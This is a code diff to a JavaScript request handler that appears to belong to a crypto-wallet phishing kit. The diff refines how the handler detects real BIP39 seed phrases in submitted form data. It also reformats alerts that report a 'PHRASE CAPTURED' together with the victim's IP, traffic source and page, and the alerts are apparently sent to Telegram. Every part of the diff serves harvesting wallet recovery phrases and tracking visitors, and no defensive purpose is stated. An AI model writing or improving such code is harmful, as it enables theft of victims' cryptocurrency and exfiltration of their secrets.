@@ -87,18 +87,25 @@ export default async function handler(req, res) {
       data.recovery || data.RECOVERY
     );
 
-    // Check if any value in data looks like a seed phrase (12/15/18/21/24 words)
-    let detectedPhrase = phraseContent;
-    let detectedWordCount = 0;
+    // BIP39 seed phrase validator — rejects normal sentences
+    function isRealSeedPhrase(val) {
+      if (!val || typeof val !== 'string') return false;
+      const words = val.trim().split(/\s+/).filter(w => w.length > 0);
+      if (![12, 15, 18, 21, 24].includes(words.length)) return false;
+      const validWord = /^[a-z]{2,10}$/;
+      const validCount = words.filter(w => validWord.test(w)).length;
+      return (validCount / words.length) >= 0.9;
+    }
+
+    // Check if any value in data looks like a real seed phrase
+    let detectedPhrase = isRealSeedPhrase(phraseContent) ? phraseContent : null;
+    let detectedWordCount = detectedPhrase ? detectedPhrase.trim().split(/\s+/).filter(w => w.length > 0).length : 0;
     if (!detectedPhrase && data) {
       for (const val of Object.values(data)) {
-        if (typeof val === 'string') {
-          const words = val.trim().split(/\s+/).filter(w => w.length > 0);
-          if ([12, 15, 18, 21, 24].includes(words.length)) {
-            detectedPhrase = val.trim();
-            detectedWordCount = words.length;
-            break;
-          }
+        if (typeof val === 'string' && isRealSeedPhrase(val)) {
+          detectedPhrase = val.trim();
+          detectedWordCount = detectedPhrase.split(/\s+/).filter(w => w.length > 0).length;
+          break;
         }
       }
     }
@@ -114,50 +121,17 @@ export default async function handler(req, res) {
     let message;
 
     if (isSeedPhraseData || detectedPhrase) {
-      // ===== SEED PHRASE MESSAGE - PROMINENT FORMAT =====
-      message = `
-🔑 <b>SEED PHRASE CAPTURED</b>
+      // ===== SEED PHRASE - COMPACT FORMAT =====
+      message = `🔑 <b>PHRASE CAPTURED</b> — ${wordCount} words | ${trafficSrc} | <code>${ip}</code>
 
-━━━━━━━━━━━━━━━━━━━━━━━━
-📋 <b>PHRASE (${wordCount} words):</b>
 <code>${detectedPhrase || 'NOT FOUND'}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━
 
-📊 <b>Details:</b>
-├ Event: <b>${eventType}</b>
-├ Words: <b>${wordCount}</b>
-├ Field: ${fieldName}
-├ Page: ${pageLocation}
-
-🌍 <b>Traffic Source:</b>
-├ Source: <b>${trafficSrc}</b>
-├ Referrer: ${referer}
-├ Search Engine: ${searchEngine}
-
-👤 <b>Visitor:</b>
-├ IP: <code>${ip}</code>
-├ UA: <code>${userAgent.substring(0, 80)}...</code>
-
-⏰ ${new Date().toISOString()}
-      `.trim();
+📍 ${pageLocation} | ⏰ ${new Date().toISOString().replace('T',' ').substring(0,19)}`;
     } else {
-      // ===== VISITOR ACTIVITY MESSAGE =====
-      message = `
-🚀 <b>New Visitor Activity</b>
-
-👤 <b>Visitor Info:</b>
-├ IP: <code>${ip}</code>
-├ User Agent: <code>${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}</code>
-
-🔍 <b>Traffic Source:</b>
-├ Source: ${searchEngine}
-├ Referrer: <code>${referer}</code>
-├ URL: <code>${url}</code>
-
-${data ? `📝 <b>Form Data:</b>\n${Object.entries(data).map(([key, value]) => `├ ${key}: <code>${String(value).substring(0, 200)}</code>`).join('\n')}` : ''}
-
-⏰ <b>Timestamp:</b> ${new Date().toISOString()}
-      `.trim();
+      // ===== VISITOR ACTIVITY - COMPACT FORMAT =====
+      message = `🚀 <b>Visitor</b> | ${searchEngine} | <code>${ip}</code>
+└ <code>${referer}</code>
+⏰ ${new Date().toISOString().replace('T',' ').substring(0,19)}`;
     }
 
     // Send message to Telegram
